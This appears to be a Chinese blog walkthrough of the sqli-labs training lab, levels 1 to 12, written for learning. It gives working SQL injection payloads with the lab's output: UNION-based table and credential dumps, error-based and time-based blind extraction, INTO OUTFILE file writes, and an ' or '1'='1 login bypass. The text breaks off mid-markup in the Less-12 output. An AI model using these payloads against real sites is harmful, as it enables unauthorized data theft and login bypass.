{"title":"sqli-labs","date":"2019-05-08T05:34:16.000Z","thumbnail":"https://i.loli.net/2019/03/03/5c7aadc5c06f9.jpg","link":"post/sqli-labs","comments":true,"tags":["CTF","SQLi"],"categories":["SQLi"],"updated":"2019-06-01T17:33:34.935Z","content":"<h2 id=\"Less-1\">Less-1<a href=\"post/sqli-labs#Less-1\"></a></h2><div class=\"article-img\"><p><img src=\"https://i.loli.net/2019/05/08/5cd1cdde003b3.png\" alt=\"1.0.png\" data-zoomable></p></div>\n<ol>\n<li><p><strong>根据提示输入id</strong></p>\n<p><code>?id=1</code></p>\n<p>回显为：</p>\n<p><code>Welcome    Dhakkan \nYour Login name:Dumb\nYour Password:Dumb</code></p>\n<p>再将 <code>id</code> 换成其他值，得到回显的是 <code>id</code> 对应的的登录名和密码，一直试到id=15发现没有了。</p>\n<p>这个时候就应该构造错误的语句去猜测SQL 查询语句是怎么样的，从而得到<strong>报错信息</strong>（通常包含重要的信息）进而进一步接近目标。构造：</p>\n<p><code>?id=1&#39;</code></p>\n<p>得到 回显</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near         &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>得知：    </p>\n</li>\n</ol>\n<ul>\n<li><p>数据库是MYSQL</p>\n</li>\n<li><p>大致语句应该是<code>SELECT xxx FROM xxx WHERE id=[] LIMIT 0,1</code></p>\n<p>接着输入：<code>?id=1 and 1=2 --+</code>回显内容正常，则说明不是数字型注入，接着构造：</p>\n<p><code>?id=1&#39; and 1=2--+</code>发现回显为空，则猜测正确是属于基于字符型的注入。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li><p><strong>看看数据有多少列</strong></p>\n<p><code>?id=1&#39; order by 5--+</code></p>\n<p>回显<code>Unknown column &#39;5&#39; in &#39;order clause&#39;</code></p>\n<p>说明列数小于5，接着使列数逐渐减小发现列数为3正好正确，说明这个数据表中有3列。</p>\n</li>\n<li><p><strong>查看显示位数：</strong></p>\n<p><code>?id=-1&#39; union select 1,2,3--+</code></p>\n<p>回显</p>\n<p><code>Your Login name:2\nYour Password:3</code></p>\n</li>\n<li><p><strong>爆破表名</strong></p>\n<p><code>?id=-1&#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+</code></p>\n<p>回显：</p>\n<p><code>Your Login name:emails,referers,uagents,users\nYour Password:2</code></p>\n</li>\n<li><p><strong>爆破users表的所有字段：</strong></p>\n<p><code>id=-1&#39; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p>\n<p>回显：</p>\n<p><code>Your Login name:id,username,password\nYour Password:2</code></p>\n</li>\n<li><p><strong>爆破这些字段的所有数据</strong><br><code>?id=-1&#39; union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;br /&gt;&#39;),2 from users--+</code><br>回显：</p>\n</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\nYour Password:<span class=\"token number\">2</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Less-2\">Less-2<a href=\"post/sqli-labs#Less-2\"></a></h2><ol>\n<li>分别以<strong>基于数字型</strong>和<strong>基于字符型</strong>的错误来判断：</li>\n</ol>\n<ul>\n<li>基于数字型：<code>?id=1 and 1=2--+</code><br>无回显</li>\n<li>基于字符型：<code>?id=1&#39; and 1=2--+</code><br>回显：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; and 1=2-- LIMIT 0,1&#39; at line 1</code><br>说明这是基于数字型的注入。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>猜测列数</strong>：<br><code>?id=1 order by 5--+</code><br>最后得到也是3列。</li>\n<li><strong>爆破表名</strong><br><code>?id=-1 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+</code><br>回显：<br><code>Your Login name:emails,referers,uagents,users\nYour Password:2</code><br>4.<strong>爆破users表的所有字段：</strong><br><code>?id=-1 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code><br>回显：<br><code>Your Login name:id,username,password\nYour Password:2</code></li>\n<li><strong>爆破这些字段的所有数据</strong><br><code>?id=-1 union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+</code><br>回显：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\nYour Password:<span class=\"token number\">2</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>总结一下前面这两个题的<code>--+</code>实际上和<code>#</code>是一样的，都表示注释，所以在<code>--+</code>前面的注入语句都是可以进入到数据库查询的，这就是这个类型SQL注入的payload。</p>\n<h2 id=\"Less-3\">Less-3<a href=\"post/sqli-labs#Less-3\"></a></h2><ol>\n<li><strong>猜测注入类型</strong>：<br><code>?id=1&#39;</code><br>回显：<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code><br>得知这是基于字符型的错误，而且还有个重要的信息就是id后面还有个<font color=\"red\"><b>后括号</b></font>！</li>\n<li><strong>爆破表名</strong><br><code>?id=-1&#39;) union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+</code><br>回显：<br><code></code>Your Login name:emails,referers,uagents,users<br>Your Password:2`</li>\n<li><strong>爆破users表的所有字段：</strong><br><code>?id=-1&#39;) union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code><br>回显：<br><code>Your Login name:id,username,password\nYour Password:2</code><br>4.<strong>爆破这些字段的所有数据</strong><br><code>?id=-1&#39;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+</code><br>回显：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\nYour Password:<span class=\"token number\">2</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Less-4\">Less-4<a href=\"post/sqli-labs#Less-4\"></a></h2><ol>\n<li><strong>猜测</strong><br><code>?id=1 and 1=2--+\n?id=1&#39; and 1=2--+\n?id=1&#39;) and 1=2--+</code><br>回显均正常。<br><code>?id=1&quot; and 1=2--+</code><br>回显报错。<br>尝试<code>?id=1&quot;) and 1=2--+</code><br>无回显，则表示是<strong>基于字符型错误</strong>，且还有括号。</li>\n<li><strong>爆破字段的所有数据</strong><br><code>?id=-1&quot;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;),2 from users--+</code><br>回显：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\nYour Password:<span class=\"token number\">2</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Less-5\">Less-5<a href=\"post/sqli-labs#Less-5\"></a></h2><ol>\n<li><strong>判断注入类型</strong><br><code>?id=1 and 1=2--+\n?id=1&#39; and 1=2--+</code><br>前者正常而后者报错，说明这是单引号的<strong>字符型错误</strong>。</li>\n<li><strong>猜列数</strong><br><code>?id=1&#39; order by 4--+</code><br><code>?id=1&#39; order by 3--+</code><br>回显是前者报错为<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code>，后者回显<code>You are in...........</code>，说明是3列。</li>\n<li><strong>猜测数据库名</strong><br><code>?id=1&#39; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+</code><br>根据回显得知当前数据库名为 <strong>security</strong>。</li>\n<li><strong>列举数据表数量和数据表名</strong><br><code>?id=1&#39; union select 1,count(*),concat_ws(&#39;QQQQ&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a--+</code><br>根据回显得到4.<br>这里遇到了很多麻烦，最后查到要用limit限制一下，最后得到数据表名为<code>emails, referers, uagents, users</code>。<br>5.<strong>爆破数据</strong><br><code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+</code><br>一直更改limit的值就可以爆破数据了。</li>\n</ol>\n<h2 id=\"Less-6\"><strong>Less-6</strong><a href=\"post/sqli-labs#Less-6\"></a></h2><ol>\n<li><strong>猜测注入类型</strong><br>发现仅仅是跟Less-5不同的是这里是双引号注入。</li>\n</ol>\n<h2 id=\"Less-7\"><strong>Less-7</strong><a href=\"post/sqli-labs#Less-7\"></a></h2><p>这个题实在是没遇见过，查看了源码。网上查找资料参考了一下，原来是导出文件GET字符型注入（<strong>双括号单引号字符型注入</strong>）</p>\n<ol>\n<li>查看列数<br><code>?id=1&#39;)) order by 3--+</code><br>根据回显判断确实是3列。且根据前面的报错是数据库<code>select ... into outfile</code>语法的使用，上网又查了一些资料，构造如下语句：<br><code>?id=1%27))%20union%20select%20*%20from%20users%20into%20outfile%20%27G:\\\\phpStudySetup\\\\PHPTutorial\\\\WWW\\\\sqli-labs\\\\Less-7\\\\data.txt%27--+</code><br>回显：<br><code>You have an error in your SQL syntax</code><br>又跑到网上查询了一下，原来是权限不够，用这个语句试试<code>?id=1&#39;)) and user()=&#39;root@localhost&#39;--+</code>得知权限不够。如下图：<br><img src=\"https://i.loli.net/2019/05/08/5cd1cddbc5f28.png\" alt=\"1.png\"><br>接着打开MYSQL配置文件<code>my.ini</code>设置(添加)参数<code>secure_file_priv =</code><br>参考：<a href=\"https://www.cnblogs.com/xm17/p/9691070.html\" target=\"_blank\" rel=\"noopener\">mysql secure_file_priv 文件读写问题</a><br>保存重启MYSQL就OK了。<br>即使回显<code>You have an error in your SQL syntax</code>，但是到文件目录可以看到文件已经下载下来了！！！</li>\n</ol>\n<div class=\"article-img\"><p><img src=\"https://i.loli.net/2019/05/08/5cd1cddc9f6b1.png\" alt=\"2.png\" data-zoomable></p></div>\n<h2 id=\"Less-8\">Less-8<a href=\"post/sqli-labs#Less-8\"></a></h2><ol>\n<li><strong>测试注入类型</strong><br><code>?id=1&#39; and 1=2--+</code><br>无回显判断为<strong>基于错误类型的单引号注入</strong>。<br>2.<strong>依据上题思路下载数据信息</strong><br><code>?id=1&#39; union select * from users into outfile &#39;G:\\phpStudySetup\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\\\less8.txt&#39;--+</code></li>\n</ol>\n<h2 id=\"Less-9\">Less-9<a href=\"post/sqli-labs#Less-9\"></a></h2><ol>\n<li><strong>测试注入类型</strong><br>网上参考了些资料加之分析了一下源代码，原来是<strong>基于时间的单引号注入</strong>。<br>因为以下两个语句明显看到后者反应时间变长了：<br><code>?id=1 and sleep(5)--+</code><br><code>?id=1&#39; and sleep(5)--+</code></li>\n<li><strong>猜测数据库名长度</strong><br><code>?id=1&#39; and if(length(database())=number,1,sleep(5))--+</code><br>不断改变<code>number</code>值，当某个值正好无明显的延时的时候则表示这个数字就是数据库名长度，最后得到<code>8</code>。</li>\n<li><strong>爆破数据库名</strong><br><code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></li>\n<li>爆破数据库名爆表名<br>?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,sleep(5))–+</li>\n<li><strong>爆破数据表名</strong><br><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),1,1))=105,1,sleep(5))--+</code></li>\n<li><strong>爆破数据</strong><br><code>?id=1&#39; and if(ascii(substr((select id from security.users limit 0,1),1,1))=0x31,1,sleep(5))--+</code><br><code>id=1&#39; and if(ascii(substr((select username from security.users limit 0,1),1,1))=68,1,sleep(5))--+</code></li>\n</ol>\n<h2 id=\"Less-10\">Less-10<a href=\"post/sqli-labs#Less-10\"></a></h2><ol>\n<li><strong>判断注入类型</strong><br>将上题的单引号改为双引号后，发现对了，正好就是<strong>基于时间错误的双引号注入</strong>。</li>\n</ol>\n<h2 id=\"Less-11\">Less-11<a href=\"post/sqli-labs#Less-11\"></a></h2><p>这个题是POST类型的注入，我这里使用的是Firefox的插件Hackbar。注意<font color=\"red\"><b>在 Mozilla FireFox 的 Hackbar 中，Post data 的注释用 –&lt;空格&gt; 而不是 –+ （很奇怪），导致我原来一直报错，然后我就把注释改成 # 了</b></font></p>\n<ol>\n<li><strong>检查表单的用户名和密码的<code>name</code>属性</strong>：</li>\n</ol>\n<div class=\"article-img\"><p><img src=\"https://i.loli.net/2019/05/08/5cd1cddcd3f06.png\" alt=\"3.png\" data-zoomable></p></div>\n<ol start=\"2\">\n<li><strong>判断注入类型</strong><br>在 username 中输入 <code>admin&#39;--+</code>，很奇怪，若输入<code>admin&#39;#</code>则直接获得admin的信息了。<br>在 password 中输入任意内容<br>回显内容：<br> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39; LIMIT 0,1&#39; at line 1</code><br>根据回显判断为：<strong>基于错误的POST型单引号字符型注入</strong>。<br>或者使用万能密码：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">在 username 中输入 admin<span class=\"token string\">' or '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> \n在 password 中输入任意内容\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ol start=\"3\">\n<li><strong>猜列数</strong><br><code>uname=1&amp;passwd=1&#39; or 1 order by 3#&amp;submit=Submit</code><br><img src=\"https://i.loli.net/2019/05/08/5cd1cdde3c1d9.png\" alt=\"4.png\"><br><code>uname=1&amp;passwd=1&#39; or 1 order by 2#&amp;submit=Submit</code><br><img src=\"https://i.loli.net/2019/05/08/5cd1cdddee9ef.png\" alt=\"5.png\"><br>说明有2列。</li>\n<li><strong>结合Less-1爆破表名</strong><br><code>uname=1&amp;passwd=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>回显：<br><code>Your Login name:1\nYour Password:emails,referers,uagents,users</code></li>\n<li><strong>爆破列名</strong><br><code>uname=1&amp;passwd=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;#</code><br>回显：<br><code>Your Login name:1\nYour Password:id,username,password</code></li>\n<li><strong>爆破数据</strong><br><code>uname=1&amp;passwd=1&#39; union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;) from users#</code><br>回显：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token number\">1</span>\nYour Password:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Less-12\">Less-12<a href=\"post/sqli-labs#Less-12\"></a></h2><ol>\n<li><strong>判断注入类型</strong><br>这个题花了我很多时间，主要还是因为题目说是双引号，所以我就试了很多次都没成。但是最后看了一下源代码，原来是<strong>双引号与括号的闭合</strong>。故是在上一个题的基础上，把单引号<code>&#39;</code>改成<code>&quot;)</code>就可以了。</li>\n<li><strong>爆破数据</strong><br><code>uname=1&amp;passwd=1&quot;) union select 1,group_concat(concat(&#39;(&#39;,id,&#39;,&#39;,username,&#39;,&#39;,password,&#39;)&#39;) separator &#39;&lt;/br&gt;&#39;) from users#</code><br>回显：</li>\n</ol>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">Your Login name:<span class=\"token number\">1</span>\nYour Password:<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">,</span>Dumb<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>Angelina<span class=\"token punctuation\">,</span>I<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">Dummy</span><span class=\"token punctuation\">,</span>p<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>secure<span class=\"token punctuation\">,</span>crappy<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>stupid<span class=\"token 